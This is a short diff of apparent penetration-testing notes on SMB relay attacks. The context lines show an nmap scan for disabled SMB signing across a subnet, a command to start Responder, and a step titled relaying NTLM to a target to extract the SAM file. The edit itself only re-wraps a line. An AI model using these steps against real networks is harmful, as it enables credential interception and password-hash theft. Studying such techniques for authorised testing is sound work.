@@ -8,7 +8,8 @@ Created Friday 30 October 2020
 Vulnerable if message_signing: disabled:
 # nmap -n -Pn -p 445 --script smbsecurity-
 mode 10.5.23.0/24
-Disable SMB and HTTP in Responder.conf and
+Disable SMB and HTTP in Responder.
+conf and
 start Responder:
 # ./Responder.py -I eth0
 NTLM Relay to target and extract SAM file:
